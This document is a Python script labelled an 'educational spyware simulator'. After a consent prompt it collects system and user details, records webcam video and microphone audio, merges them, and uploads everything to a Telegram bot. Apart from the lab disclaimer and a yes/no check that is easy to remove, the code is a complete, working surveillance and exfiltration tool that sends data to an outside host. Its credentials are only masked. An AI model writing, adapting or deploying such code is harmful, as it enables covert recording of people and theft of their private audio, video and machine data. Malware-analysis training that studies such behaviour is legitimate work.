import cv2
import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
import requests
import time
import logging
import platform
import getpass
import socket
import psutil
from moviepy import VideoFileClip, AudioFileClip

# TELEGRAM CONFIGURATION

BOT_TOKEN = "***********************"
CHAT_ID = "******************"

# EDUCATIONAL DISCLAIMER

print("\n=== Educational Spyware Behavior Simulator ===")
print("This program simulates spyware-like behavior for malware analysis training.")
print("Use ONLY inside a controlled lab environment.\n")

consent = input("Do you want to continue? (yes/no): ")

if consent.lower() != "yes":
    print("Execution cancelled.")
    exit()

# LOGGING SETUP

logging.basicConfig(
    filename="simulator_activity.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

logging.info("Program started.")

# FUNCTION: SEND MESSAGE TO TELEGRAM

def send_telegram_message(message):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    try:

        response = requests.post(
            url,
            data={
                "chat_id": CHAT_ID,
                "text": message
            }
        )

        if response.status_code == 200:
            print("System information sent to Telegram.")
        else:
            print("Telegram message error:", response.text)

    except Exception as e:
        print("Telegram message failed:", e)

# FUNCTION: COLLECT SYSTEM INFO

def get_system_info():

    info = {
        "Username": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Platform": platform.platform(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }

    message = "===== SYSTEM INFORMATION =====\n"

    print("\n===== SYSTEM INFORMATION =====")

    for key, value in info.items():

        print(f"{key}: {value}")
        logging.info(f"{key}: {value}")
        message += f"{key}: {value}\n"

    print("==============================\n")

    send_telegram_message(message)

# COLLECT SYSTEM INFO

get_system_info()

# RECORDING SETTINGS

sample_rate = 44100
duration = 30
fps = 15
resolution = (640, 480)

filename_time = datetime.now().strftime('%Y%m%d_%H%M%S')

video_filename = f"video_{filename_time}.avi"
audio_filename = f"audio_{filename_time}.wav"
final_filename = f"final_{filename_time}.mp4"

logging.info("Recording settings initialized.")

# START CAMERA

cap = cv2.VideoCapture(0)

if not cap.isOpened():

    print("Error: Camera not accessible")
    logging.error("Camera not accessible.")
    exit()

cap.set(cv2.CAP_PROP_FRAME_WIDTH, resolution[0])
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, resolution[1])
cap.set(cv2.CAP_PROP_FPS, fps)

fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter(video_filename, fourcc, fps, resolution)

print("\nRecording video and audio for analysis...")
logging.info("Recording started.")

# START AUDIO RECORDING

audio_data = sd.rec(
    int(sample_rate * duration),
    samplerate=sample_rate,
    channels=1,
    dtype='int16'
)

# RECORD VIDEO

frames_to_capture = fps * duration

for i in range(frames_to_capture):

    frame_start = time.time()

    ret, frame = cap.read()

    if ret:
        out.write(frame)
    else:
        logging.warning("Frame capture failed")

    elapsed = time.time() - frame_start
    wait_time = (1 / fps) - elapsed

    if wait_time > 0:
        time.sleep(wait_time)

sd.wait()

print("Recording completed.")
logging.info("Recording finished.")

# SAVE AUDIO

write(audio_filename, sample_rate, audio_data)

cap.release()
out.release()

logging.info("Audio and video files saved.")

# MERGE AUDIO + VIDEO

print("Merging audio and video...")
logging.info("Merging media files.")

video_clip = VideoFileClip(video_filename)
audio_clip = AudioFileClip(audio_filename)

# Trim audio exactly to video length (fix lip-sync)
audio_clip = audio_clip.subclipped(0, video_clip.duration)

final_clip = video_clip.with_audio(audio_clip)

final_clip.write_videofile(
    final_filename,
    codec="libx264",
    audio_codec="aac"
)

video_clip.close()
audio_clip.close()
final_clip.close()

logging.info("Media merged successfully.")

# SEND FILE TO TELEGRAM

print("Sending file to Telegram...")
logging.info("Attempting Telegram upload")

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

try:

    with open(final_filename, "rb") as file:

        response = requests.post(
            url,
            data={"chat_id": CHAT_ID},
            files={"document": file}
        )

    if response.status_code == 200:

        print("File sent successfully.")
        logging.info("File sent to Telegram successfully")

    else:

        print("Telegram error:", response.text)
        logging.error(response.text)

except Exception as e:

    print("Upload failed:", e)
    logging.error(str(e))

print("\nSimulation completed.")
logging.info("Program execution completed.")

# FORENSIC FILES

print("\nFiles retained for forensic analysis:")
print(video_filename)
print(audio_filename)
print(final_filename)
print("Log file: simulator_activity.log")